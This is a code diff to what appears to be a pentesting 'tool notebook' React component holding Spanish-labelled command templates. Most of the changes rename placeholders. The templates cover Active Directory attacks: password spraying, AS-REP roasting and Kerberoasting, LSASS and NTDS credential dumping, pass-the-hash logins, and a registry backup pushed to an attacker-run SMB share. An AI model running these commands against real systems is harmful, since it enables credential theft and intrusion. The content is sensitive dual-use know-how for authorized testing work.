@@ -49,50 +49,50 @@ function note(id: string, group: ToolCategory, name: string, notes: string): Too
 const defaultTools: ToolTemplate[] = [
   tool("recon-nxc-smb", "Recon", "NetExec SMB baseline", "nxc", "nxc smb <ip_or_cidr>", "<ip_or_cidr>"),
   tool("recon-hosts-file", "Recon", "Editar /etc/hosts", "nano", "nano /etc/hosts", "localhost"),
-  tool("recon-rustscan-scv", "Recon", "RustScan + scripts/versiones", "rustscan", "rustscan -a <ip_target> --no-banner -- -sCV", "<ip_target>"),
-  tool("recon-nmap-udp-top", "Recon", "Nmap UDP top ports", "nmap", "nmap -sUV -vv --reason --version-intensity 0 --min-rate 1300 --max-retries 1 --top-ports 1000 <ip_target> -Pn", "<ip_target>"),
-  tool("recon-snmp-161", "Recon", "Nmap SNMP 161", "nmap", "nmap -sU -p 161 <ip_target>", "<ip_target>"),
-  tool("recon-proxychains-mixed", "Recon", "Proxychains puertos AD", "proxychains", "proxychains nmap -sT -sU -p22,161,135,139,445,88,3389 <ip_target>", "<ip_target>"),
+  tool("recon-rustscan-scv", "Recon", "RustScan + scripts/versiones", "rustscan", "rustscan -a <target_ip> --no-banner -- -sCV", "<target_ip>"),
+  tool("recon-nmap-udp-top", "Recon", "Nmap UDP top ports", "nmap", "nmap -sUV -vv --reason --version-intensity 0 --min-rate 1300 --max-retries 1 --top-ports 1000 <target_ip> -Pn", "<target_ip>"),
+  tool("recon-snmp-161", "Recon", "Nmap UDP puerto", "nmap", "nmap -sU -p <port> <target_ip>", "<target_ip>"),
+  tool("recon-proxychains-mixed", "Recon", "Proxychains puertos AD", "proxychains", "proxychains nmap -sT -sU -p22,161,135,139,445,88,3389 <target_ip>", "<target_ip>"),
 
-  tool("enum-rpc-null", "Enumeracion", "RPC null session", "rpcclient", "rpcclient -U \"\" <ip_target> -N", "<ip_target>"),
-  tool("enum-rpc-creds", "Enumeracion", "RPC con credenciales", "rpcclient", "rpcclient -U \"<usuario>%<password>\" <ip_target>", "<ip_target>"),
-  tool("enum-rpc-guest", "Enumeracion", "RPC guest", "rpcclient", "rpcclient -U \"guest%\" <ip_target>", "<ip_target>"),
-  tool("enum-nxc-smb-null-shares", "Enumeracion", "SMB shares null", "nxc", "nxc smb <ip_target> -u '' -p '' --shares", "<ip_target>"),
-  tool("enum-nxc-smb-null-rid", "Enumeracion", "RID brute null", "nxc", "nxc smb <ip_target> -u '' -p '' --rid-brute", "<ip_target>"),
-  tool("enum-nxc-smb-guest-shares", "Enumeracion", "SMB shares guest", "nxc", "nxc smb <ip_target> -u 'Guest' -p '' --shares", "<ip_target>"),
-  tool("enum-nxc-smb-guest-rid", "Enumeracion", "RID brute guest", "nxc", "nxc smb <ip_target> -u 'Guest' -p '' --rid-brute", "<ip_target>"),
-  tool("enum-nxc-users-passwords", "Enumeracion", "Password spray user=user", "nxc", "nxc smb <ip_target> -u users -p users --no-bruteforce --continue-on-success", "<ip_target>", "Usar listas controladas. Cambia users por ficheros reales si procede."),
-  tool("enum-smbclient-null-download", "Enumeracion", "Descargar share anonimo", "smbclient", "smbclient -N //<ip_target>/<share>/ -c \"recurse; prompt; mget *;\"", "<ip_target>"),
-  tool("enum-smbclient-auth-download", "Enumeracion", "Descargar share con usuario", "smbclient", "smbclient //<ip_target>/<share>/ -U <user> -c \"recurse; prompt; mget *;\"", "<ip_target>"),
-  tool("enum-ldap-anon", "Enumeracion", "LDAP anonimo", "ldapsearch", "ldapsearch -x -H ldap://<dc_ip> -b 'DC=<domain_part>,DC=<domain_part>'", "<dc_ip>"),
-  tool("enum-ldap-auth", "Enumeracion", "LDAP autenticado", "ldapsearch", "ldapsearch -x -H ldap://<dc_ip> -D '<user>@<domain>' -w '<password>' -b 'DC=<domain_part>,DC=<domain_part>'", "<dc_ip>"),
-  tool("enum-ldap-grep-passwords", "Enumeracion", "Filtrar LDAP por secretos", "grep", "grep -iE \"pwd|desc|password\" -C 3 <ldap_output_file>", "localhost"),
-  tool("enum-ldapdomaindump", "Enumeracion", "ldapdomaindump", "ldapdomaindump", "ldapdomaindump -u '<dominio>\\<usuario>' -p '<password>' <dc_ip>", "<dc_ip>"),
+  tool("enum-rpc-null", "Enumeracion", "RPC null session", "rpcclient", "rpcclient -U \"\" <target_ip> -N", "<target_ip>"),
+  tool("enum-rpc-creds", "Enumeracion", "RPC con credenciales", "rpcclient", "rpcclient -U \"<user>%<password>\" <target_ip>", "<target_ip>"),
+  tool("enum-rpc-guest", "Enumeracion", "RPC guest", "rpcclient", "rpcclient -U \"guest%\" <target_ip>", "<target_ip>"),
+  tool("enum-nxc-smb-null-shares", "Enumeracion", "SMB shares null", "nxc", "nxc smb <target_ip> -u '' -p '' --shares", "<target_ip>"),
+  tool("enum-nxc-smb-null-rid", "Enumeracion", "RID brute null", "nxc", "nxc smb <target_ip> -u '' -p '' --rid-brute", "<target_ip>"),
+  tool("enum-nxc-smb-guest-shares", "Enumeracion", "SMB shares guest", "nxc", "nxc smb <target_ip> -u 'Guest' -p '' --shares", "<target_ip>"),
+  tool("enum-nxc-smb-guest-rid", "Enumeracion", "RID brute guest", "nxc", "nxc smb <target_ip> -u 'Guest' -p '' --rid-brute", "<target_ip>"),
+  tool("enum-nxc-users-passwords", "Enumeracion", "Password spray user=user", "nxc", "nxc smb <target_ip> -u <users_list> -p <users_list> --no-bruteforce --continue-on-success", "<target_ip>", "Usar listas controladas. Cambia users por ficheros reales si procede."),
+  tool("enum-smbclient-null-download", "Enumeracion", "Descargar share anonimo", "smbclient", "smbclient -N //<target_ip>/<share>/ -c \"recurse; prompt; mget *;\"", "<target_ip>"),
+  tool("enum-smbclient-auth-download", "Enumeracion", "Descargar share con usuario", "smbclient", "smbclient //<target_ip>/<share>/ -U <user> -c \"recurse; prompt; mget *;\"", "<target_ip>"),
+  tool("enum-ldap-anon", "Enumeracion", "LDAP anonimo", "ldapsearch", "ldapsearch -x -H ldap://<ip_dc> -b 'DC=<domain_part>,DC=<domain_part>'", "<ip_dc>"),
+  tool("enum-ldap-auth", "Enumeracion", "LDAP autenticado", "ldapsearch", "ldapsearch -x -H ldap://<ip_dc> -D '<user>@<domain>' -w '<password>' -b 'DC=<domain_part>,DC=<domain_part>'", "<ip_dc>"),
+  tool("enum-ldap-grep-passwords", "Enumeracion", "Filtrar LDAP por secretos", "grep", "grep -iE \"pwd|desc|password\" -C 3 <file>", "localhost"),
+  tool("enum-ldapdomaindump", "Enumeracion", "ldapdomaindump", "ldapdomaindump", "ldapdomaindump -u '<domain>\\<user>' -p '<password>' <ip_dc>", "<ip_dc>"),
   tool("enum-neo4j-start", "Enumeracion", "Iniciar Neo4j", "neo4j", "neo4j start", "localhost"),
-  tool("enum-bloodhound-python", "Enumeracion", "BloodHound collection", "bloodhound-python", "bloodhound-python -u <username> -p <password> -ns <ip_dc> -d <dominio.local> -c all", "<ip_dc>"),
+  tool("enum-bloodhound-python", "Enumeracion", "BloodHound collection", "bloodhound-python", "bloodhound-python -u <user> -p <password> -ns <ip_dc> -d <domain> -c all", "<ip_dc>"),
   tool("enum-ntp-stop-sync", "Enumeracion", "Parar timesyncd", "systemctl", "systemctl stop systemd-timesyncd", "localhost"),
   tool("enum-ntpdate-dc", "Enumeracion", "Sincronizar hora con DC", "ntpdate", "ntpdate <ip_dc>", "<ip_dc>"),
 
-  tool("cred-kerbrute-userenum", "Credenciales", "Kerbrute userenum", "kerbrute", "kerbrute userenum --dc <dc_ip> -d <dominio> <users_list>", "<dc_ip>"),
-  tool("cred-asrep", "Credenciales", "AS-REP roast", "impacket-GetNPUsers", "impacket-GetNPUsers -no-pass -usersfile <user_list> <dominio>/", "<dc_ip>"),
-  tool("cred-kerberoast", "Credenciales", "Kerberoast", "impacket-GetUserSPNs", "impacket-GetUserSPNs <dominio>/<user>:<password> -dc-ip <dc_ip> -request -outputfile hashes", "<dc_ip>"),
-  tool("cred-certipy-vuln", "Credenciales", "Certipy templates vulnerables", "certipy-ad", "certipy-ad find -u <user> -p <password> -dc-ip <dc_ip> -vulnerable", "<dc_ip>"),
-  tool("cred-lsassy-pass", "Credenciales", "LSASS con password", "lsassy", "lsassy -d <dominio.htb> -u <user> -p <password> <ip_target>", "<ip_target>", "Necesita credenciales admin local."),
-  tool("cred-lsassy-hash", "Credenciales", "LSASS con hash NT", "lsassy", "lsassy -d <dominio.htb> -u <user> -H ':<NT>' <ip_target>", "<ip_target>", "Necesita credenciales admin local."),
-  tool("cred-ntds", "Credenciales", "Dumpear NTDS con nxc", "nxc", "nxc smb <ip_dc> -u <user> -H <NT> --ntds", "<ip_dc>"),
+  tool("cred-kerbrute-userenum", "Credenciales", "Kerbrute userenum", "kerbrute", "kerbrute userenum --dc <ip_dc> -d <domain> <users_list>", "<ip_dc>"),
+  tool("cred-asrep", "Credenciales", "AS-REP roast", "impacket-GetNPUsers", "impacket-GetNPUsers -no-pass -usersfile <users_list> -dc-ip <ip_dc> <domain>/", "<ip_dc>"),
+  tool("cred-kerberoast", "Credenciales", "Kerberoast", "impacket-GetUserSPNs", "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip_dc> -request -outputfile <file>", "<ip_dc>"),
+  tool("cred-certipy-vuln", "Credenciales", "Certipy templates vulnerables", "certipy-ad", "certipy-ad find -u <user> -p <password> -dc-ip <ip_dc> -vulnerable", "<ip_dc>"),
+  tool("cred-lsassy-pass", "Credenciales", "LSASS con password", "lsassy", "lsassy -d <domain> -u <user> -p <password> <target_ip>", "<target_ip>", "Necesita credenciales admin local."),
+  tool("cred-lsassy-hash", "Credenciales", "LSASS con hash NT", "lsassy", "lsassy -d <domain> -u <user> -H ':<hash_nt>' <target_ip>", "<target_ip>", "Necesita credenciales admin local."),
+  tool("cred-ntds", "Credenciales", "Dumpear NTDS con nxc", "nxc", "nxc smb <ip_dc> -u <user> -H <hash_nt> --ntds", "<ip_dc>"),
   tool("cred-secretsdump-sam-lsa", "Credenciales", "Secretsdump SAM + SECURITY", "impacket-secretsdump", "impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL", "localhost"),
   tool("cred-secretsdump-sam", "Credenciales", "Secretsdump SAM", "impacket-secretsdump", "impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL", "localhost"),
   tool("cred-samdump2", "Credenciales", "samdump2", "samdump2", "samdump2 SAM.save SYSTEM.save -o sam.txt", "localhost"),
-  tool("cred-john-nt", "Credenciales", "Crack NT hashes", "john", "john --format=NT --wordlist=rockyou.txt sam.txt", "localhost"),
+  tool("cred-john-nt", "Credenciales", "Crack NT hashes", "john", "john --format=NT --wordlist=<wordlist> <file>", "localhost"),
 
-  tool("exploit-evil-winrm-pass", "Explotacion", "evil-winrm password", "evil-winrm", "evil-winrm -i <ip_target> -u <user> -p <password>", "<ip_target>"),
-  tool("exploit-evil-winrm-hash", "Explotacion", "evil-winrm hash", "evil-winrm", "evil-winrm -i <ip_target> -u <user> -H <NT>", "<ip_target>"),
-  tool("exploit-psexec-pass", "Explotacion", "psexec password", "impacket-psexec", "impacket-psexec <user>@<ip_target>", "<ip_target>"),
-  tool("exploit-psexec-hash", "Explotacion", "psexec hash", "impacket-psexec", "impacket-psexec <user>@<ip_target> -hashes <LM:NT>", "<ip_target>"),
-  tool("exploit-rdp", "Explotacion", "RDP xfreerdp", "xfreerdp", "xfreerdp /v:<ip_target>:<port> /u:<user> /p:<password>", "<ip_target>"),
+  tool("exploit-evil-winrm-pass", "Explotacion", "evil-winrm password", "evil-winrm", "evil-winrm -i <target_ip> -u <user> -p <password>", "<target_ip>"),
+  tool("exploit-evil-winrm-hash", "Explotacion", "evil-winrm hash", "evil-winrm", "evil-winrm -i <target_ip> -u <user> -H <hash_nt>", "<target_ip>"),
+  tool("exploit-psexec-pass", "Explotacion", "psexec password", "impacket-psexec", "impacket-psexec <user>@<target_ip>", "<target_ip>"),
+  tool("exploit-psexec-hash", "Explotacion", "psexec hash", "impacket-psexec", "impacket-psexec <user>@<target_ip> -hashes <LM>:<hash_nt>", "<target_ip>"),
+  tool("exploit-rdp", "Explotacion", "RDP xfreerdp", "xfreerdp", "xfreerdp /v:<target_ip>:<port> /u:<user> /p:<password>", "<target_ip>"),
 
   tool("infra-smbserver", "Infra", "SMB server Kali", "impacket-smbserver", "impacket-smbserver recurso $(pwd) -smb2support", "localhost"),
-  tool("extract-reg-backup", "Extraccion", "Backup remoto de registry", "impacket-reg", "impacket-reg '<dominio>/<user>:<pass>@<ip_dc>' backup -o '\\\\<kali_ip>\\recurso'", "<ip_dc>"),
+  tool("extract-reg-backup", "Extraccion", "Backup remoto de registry", "impacket-reg", "impacket-reg '<domain>/<user>:<password>@<ip_dc>' backup -o '\\\\<kali_ip>\\recurso'", "<ip_dc>"),
   tool("extract-nxc-sam", "Extraccion", "Extraer SAM", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --sam", "<ip_dc>"),
   tool("extract-nxc-system", "Extraccion", "Extraer SYSTEM", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --system", "<ip_dc>"),
   tool("extract-nxc-security", "Extraccion", "Extraer SECURITY", "nxc", "nxc smb <ip_dc> -u <user> -p <password> --security", "<ip_dc>"),
@@ -120,8 +120,9 @@ function normalizeTool(raw: Partial<ToolTemplate>): ToolTemplate {
 }
 
 function mergeDefaults(current: ToolTemplate[]) {
-  const existingIds = new Set(current.map((item) => item.id));
-  return [...current, ...defaultTools.filter((item) => !existingIds.has(item.id))];
+  const defaultIds = new Set(defaultTools.map((item) => item.id));
+  const customTools = current.filter((item) => !defaultIds.has(item.id));
+  return [...customTools, ...defaultTools];
 }
 
 export function ToolNotebook() {
@@ -192,8 +193,8 @@ export function ToolNotebook() {
       "Recon",
       "Nueva herramienta",
       "nxc",
-      "nxc smb <ip_target>",
-      "<ip_target>",
+      "nxc smb <target_ip>",
+      "<target_ip>",
     );
     persist([newTool, ...tools]);
     startEditing(newTool);
